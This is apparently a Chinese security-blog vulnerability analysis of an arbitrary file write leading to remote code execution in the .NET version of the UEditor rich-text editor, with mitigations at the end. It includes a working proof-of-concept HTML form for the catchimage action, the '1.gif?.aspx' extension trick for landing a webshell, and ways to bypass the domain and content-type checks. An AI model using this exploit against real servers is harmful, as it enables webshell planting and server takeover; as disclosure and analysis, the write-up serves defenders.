***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 前言

**UEditor是一款所见即所得的开源富文本编辑器，具有轻量、可定制、用户体验优秀等特点，被广大WEB应用程序所使用。本次爆出的高危漏洞属于.NET版本，其它的版本暂时不受影响。漏洞成因是在抓取远程数据源的时候未对文件后缀名做验证导致任意文件写入漏洞，黑客利用此漏洞可以在服务器上执行任意指令，综合评级高危。由于时间仓促，本文分析不到位的地方还请多多谅解。**

## 漏洞利用

笔者本地测试的编辑器是官方下载最新的版本1.4.3.3 <http://ueditor.baidu.com/website/download.html>

![UEditor编辑器两个版本任意文件上传漏洞分析](https://image.3001.net/images/20180822/1534932185_5b7d34d913252.png!small)

本地构造一个html，因为不是上传漏洞所以enctype 不需要指定为multipart/form-data ，
之前见到有poc指定了这个值。完整的poc如下

    
    
    <form action="http://xxxxxxxxx/controller.ashx?action=catchimage"enctype="application/x-www-form-urlencoded"  method="POST">
    
      <p>shell addr:<input type="text" name="source[]" /></p >
    
      <inputtype="submit" value="Submit" />
    
    </form>

需准备一个图片马儿，远程shell地址需要指定扩展名为 1.gif?.aspx

![UEditor编辑器两个版本任意文件上传漏洞分析](https://image.3001.net/images/20180822/1534932780_5b7d372cb34a6.png!small)

成功返回webshell

![UEditor编辑器两个版本任意文件上传漏洞分析](https://image.3001.net/images/20180822/1534932112_5b7d3490416ee.png!small)

## 漏洞分析

在本地IIS中将目录快速指向到解压后的目录，再访问controller.ashx 控制器文件。当出现下图的时候表示编辑器成功运行。

![UEditor编辑器两个版本任意文件上传漏洞分析](https://image.3001.net/images/20180822/1534932260_5b7d3524f222c.png!small)控制器中存在多个动作的调用，包含了uploadimage、uploadscrawl、uploadvideo、uploadfile、catchimage等等

![UEditor编辑器两个版本任意文件上传漏洞分析](https://image.3001.net/images/20180822/1534932844_5b7d376c39e5a.png!small)

这些动作默认情况下都可以远程访问，不排除还有新的高危漏洞；这篇文章重点来介绍catchimage这个分支条件，由于它实例化了CrawlerHandler这个类，所以需要跟进这个一般处理程序类

![UEditor编辑器两个版本任意文件上传漏洞分析](https://image.3001.net/images/20180822/1534932292_5b7d354483f74.png!small)第一行就获取了外界传入的source[]
数组，核心调用位于 Crawlers = Sources.Select(x=> new Crawler(x,
Server).Fetch()).ToArray(); 通过这段lambda表达式来调用类里的方法执行后的结果 ，如下图跟进Fecth方法体内

![UEditor编辑器两个版本任意文件上传漏洞分析](https://image.3001.net/images/20180822/1534932433_5b7d35d1bced8.png!small)

首先通过IsExternalIPAddress方法判断是否是一个可被DNS解析的域名地址，如果不是就终止运行，逻辑代码如下

![UEditor编辑器两个版本任意文件上传漏洞分析](https://image.3001.net/images/20180822/1534932501_5b7d361526a8a.png!small)

这句判断就是 1.5.0开发版本（<https://github.com/fex-team/ueditor/blob/dev-1.5.0/net/App_Code/CrawlerHandler.cs>）和官方发布版本1.4.3.3最大的区别，在1.5.0版本中删除了此处的判断，导致在任意一个ip地址或域名下都可以执行exp如下图

![UEditor编辑器两个版本任意文件上传漏洞分析](https://image.3001.net/images/20180822/1534932515_5b7d3623a3eb9.png!small)

相对来说1.5.0版本更加容易触发此漏洞；而在1.4.3.3版本中攻击者需要提供一个正常的域名地址就可以绕过此处判断；然后进入第二个条件判断 ：
对文件ContentType的识别

![UEditor编辑器两个版本任意文件上传漏洞分析](https://image.3001.net/images/20180822/1534932535_5b7d3637b255c.png!small)这段代码很眼熟，一般常见于php文件上传的时候对文件头的判断，这段代码很容易绕过，只需要构造一张图片马儿就可以绕过它的判断，或者构造一个gif89的假图片也可以绕过；最后编辑器根据配置文件的信息创建对应的目录结构再保存文件，代码如下  

![UEditor编辑器两个版本任意文件上传漏洞分析](https://image.3001.net/images/20180822/1534932551_5b7d36478274e.png!small)至此RCE漏洞原理大致已经清楚明了，期待官方尽快发布漏洞补丁程序。

## 防御措施

> 1\. 修改CrawlerHandler.cs 增加对文件扩展名的；
>
> 2\. IPS等防御产品可以加入相应的特征

 ***本文作者：360 云影实验室，转载请注明来自 FreeBuf.COM。**

